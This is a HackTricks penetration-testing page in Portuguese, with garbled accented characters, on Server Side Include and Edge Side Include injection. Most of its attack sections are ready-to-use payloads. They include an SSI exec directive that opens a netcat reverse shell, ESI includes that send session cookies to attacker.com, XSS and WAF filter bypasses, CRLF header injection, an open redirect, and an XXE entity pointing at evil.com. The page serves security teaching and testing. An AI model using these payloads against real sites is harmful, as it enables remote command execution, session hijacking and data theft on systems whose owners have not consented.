# Inje√ß√£o de Inclus√£o do Lado do Servidor/Inclus√£o do Lado do Edge

<details>

<summary><strong>Aprenda hacking AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Informa√ß√µes B√°sicas sobre Inclus√£o do Lado do Servidor

**(Introdu√ß√£o retirada da [documenta√ß√£o do Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) s√£o diretivas que s√£o **colocadas em p√°ginas HTML e avaliadas no servidor** enquanto as p√°ginas est√£o sendo servidas. Elas permitem que voc√™ **adicione conte√∫do gerado dinamicamente** a uma p√°gina HTML existente, sem precisar servir a p√°gina inteira por meio de um programa CGI ou outra tecnologia din√¢mica.\
Por exemplo, voc√™ pode colocar uma diretiva em uma p√°gina HTML existente, como:

`<!--#echo var="DATE_LOCAL" -->`

E, quando a p√°gina √© servida, este fragmento ser√° avaliado e substitu√≠do por seu valor:

`Ter√ßa-feira, 15-Jan-2013 19:28:54 EST`

A decis√£o de quando usar SSI e quando ter sua p√°gina inteiramente gerada por algum programa √© geralmente uma quest√£o de quanta parte da p√°gina √© est√°tica e quanto precisa ser recalculado toda vez que a p√°gina √© servida. SSI √© uma √≥tima maneira de adicionar pequenos peda√ßos de informa√ß√£o, como o hor√°rio atual - mostrado acima. Mas se a maioria da sua p√°gina est√° sendo gerada no momento em que √© servida, voc√™ precisa procurar por outra solu√ß√£o.

Voc√™ pode inferir a presen√ßa de SSI se a aplica√ß√£o web usar arquivos com as extens√µes \*\* `.shtml`, `.shtm` ou `.stm`\*\*, mas n√£o √© o √∫nico caso.

Uma express√£o SSI t√≠pica tem o seguinte formato:
```
<!--#directive param="value" -->
```
### Verifica√ß√£o
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Inclus√£o Lateral

Existe um problema **em cachear informa√ß√µes ou aplica√ß√µes din√¢micas** pois parte do conte√∫do pode ter **varia√ß√µes** para a pr√≥xima vez que o conte√∫do for recuperado. √â para isso que o **ESI** √© utilizado, para indicar usando tags ESI o **conte√∫do din√¢mico que precisa ser gerado** antes de enviar a vers√£o em cache. Se um **atacante** for capaz de **injetar uma tag ESI** dentro do conte√∫do em cache, ent√£o ele poderia ser capaz de **injetar conte√∫do arbitr√°rio** no documento antes que seja enviado aos usu√°rios.

### Detec√ß√£o de ESI

O seguinte **cabe√ßalho** em uma resposta do servidor significa que o servidor est√° usando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Se n√£o conseguir encontrar este cabe√ßalho, o servidor **pode estar a usar ESI de qualquer forma**.\
Uma **abordagem de explora√ß√£o cega tamb√©m pode ser usada** pois um pedido deve chegar ao servidor do atacante:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Explora√ß√£o de ESI

[GoSecure criou](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) uma tabela para entender poss√≠veis ataques que podemos tentar contra diferentes softwares capazes de ESI, dependendo da funcionalidade suportada:

* **Includes**: Suporta a diretiva `<esi:includes>`
* **Vars**: Suporta a diretiva `<esi:vars>`. √ötil para contornar Filtros XSS
* **Cookie**: Os cookies do documento s√£o acess√≠veis ao mecanismo ESI
* **Upstream Headers Required**: As aplica√ß√µes substitutas n√£o processar√£o declara√ß√µes ESI a menos que a aplica√ß√£o upstream forne√ßa os cabe√ßalhos
* **Host Allowlist**: Neste caso, as inclus√µes ESI s√£o poss√≠veis apenas a partir de hosts de servidor permitidos, tornando SSRF, por exemplo, apenas poss√≠vel contra esses hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Sim     |    Sim   |     Sim     |              Sim              |         N√£o        |
|         Varnish Cache        |      Sim     |    N√£o   |      N√£o    |              Sim              |         Sim        |
|            Fastly            |      Sim     |    N√£o   |      N√£o    |               N√£o             |         Sim        |
| Akamai ESI Test Server (ETS) |      Sim     |    Sim   |     Sim     |               N√£o             |         N√£o        |
|          NodeJS esi          |      Sim     |    Sim   |     Sim     |               N√£o             |         N√£o        |
|         NodeJS nodesi        |      Sim     |    N√£o   |      N√£o    |               N√£o             |      Opcional     |

#### XSS

A seguinte diretiva ESI carregar√° um arquivo arbitr√°rio dentro da resposta do servidor
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Bypassar a prote√ß√£o XSS do cliente
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Roubar Cookie

* Roubo remoto de cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Roubar cookie HTTP\_ONLY com XSS refletindo-o na resposta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Arquivo Local Privado

N√£o confunda isso com uma "Inclus√£o de Arquivo Local":
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) stands for the sequence of two ASCII characters, 0x0D and 0x0A, which are used to denote a line break in text files. In the context of server-side and edge-side inclusion, CRLF injection refers to the technique of injecting CRLF sequences into input data to manipulate the behavior of the server or web application. This can be exploited to perform various attacks such as HTTP response splitting and header injection.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Redirecionamento Aberto

O seguinte ir√° adicionar um cabe√ßalho `Location` √† resposta
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Adicionar Cabe√ßalho

* Adicionar cabe√ßalho na solicita√ß√£o for√ßada
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Adicionar cabe√ßalho na resposta (√∫til para contornar "Content-Type: text/json" em uma resposta com XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF em Adicionar cabe√ßalho (**CVE-2019-2438)**
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Isso enviar√° informa√ß√µes de depura√ß√£o inclu√≠das na resposta:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Ao especificar o valor `xslt` para o par√¢metro _dca_, √© vi√°vel incluir ESI baseado em **`eXtensible Stylesheet Language Transformations (XSLT)`**. A inclus√£o faz com que o servidor HTTP recupere os arquivos XML e XSLT, sendo que este √∫ltimo filtra o primeiro. Tais arquivos XML s√£o explor√°veis para ataques de _XML External Entity (XXE)_, permitindo que os atacantes executem ataques SSRF. No entanto, a utilidade desse m√©todo √© limitada, uma vez que as inclus√µes ESI j√° servem como um vetor SSRF. Devido √† aus√™ncia de suporte na biblioteca Xalan subjacente, DTDs externos n√£o s√£o processados, impedindo a extra√ß√£o de arquivos locais.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Ficheiro XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Verifique a p√°gina XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Refer√™ncias

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
